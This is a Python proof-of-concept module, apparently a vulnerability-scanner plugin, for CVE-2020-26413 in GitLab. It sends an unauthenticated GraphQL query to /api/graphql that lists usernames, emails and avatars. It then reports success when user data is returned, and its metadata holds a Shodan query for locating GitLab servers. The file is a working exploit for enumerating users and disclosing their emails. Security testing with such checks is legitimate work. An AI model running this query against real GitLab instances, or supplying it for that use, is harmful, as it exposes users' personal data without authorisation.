import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Gitlab User enumeration via Graphql API''',
        "description": '''An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.4 before 13.6.2. Information disclosure via GraphQL results in user email being unexpectedly visible.''',
        "severity": "medium",
        "references": [
            "https://gitlab.com/gitlab-org/gitlab/-/issues/244275", 
            "https://gitlab.com/gitlab-org/cves/-/blob/master/2020/CVE-2020-26413.json", 
            "https://nvd.nist.gov/vuln/detail/CVE-2020-26413"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-26413",
            "cwe-id": "CWE-200"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.title:"GitLab"'''
        },
        "tags": ["cve", "cve2020", "gitlab", "exposure", "enum", "graphql"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/graphql"""
        method = "POST"
        data = {
            "query": "{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }",
            "variables": None,
            "operationName": None
        }
        headers = {'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""username":""" in resp0.text and """avatarUrl":""" in resp0.text and """node":""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url